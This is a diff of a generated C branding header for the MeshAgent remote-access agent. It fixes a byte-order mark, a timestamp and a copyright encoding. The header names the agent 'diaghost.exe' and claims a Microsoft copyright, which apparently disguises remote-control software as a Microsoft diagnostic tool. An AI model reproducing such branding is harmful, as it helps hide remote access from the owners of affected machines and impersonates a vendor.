@@ -1,5 +1,5 @@
-﻿/* Generated file - do not edit. */
-/* Generated on: 2025-10-23 19:19:03 */
+/* Generated file - do not edit. */
+/* Generated on: 2025-10-23 21:10:19 */
 #ifndef GENERATED_MESHAGENT_BRANDING_H
 #define GENERATED_MESHAGENT_BRANDING_H
 
@@ -17,7 +17,7 @@
 #undef MESH_AGENT_INTERNAL_NAME
 #define MESH_AGENT_INTERNAL_NAME "diaghost.exe"
 #undef MESH_AGENT_COPYRIGHT
-#define MESH_AGENT_COPYRIGHT "Â© Microsoft Corporation. All rights reserved."
+#define MESH_AGENT_COPYRIGHT "© Microsoft Corporation. All rights reserved."
 #undef MESH_AGENT_ORIGINAL_FILENAME
 #define MESH_AGENT_ORIGINAL_FILENAME "diaghost.exe"
 #undef MESH_AGENT_LOG_DIRECTORY
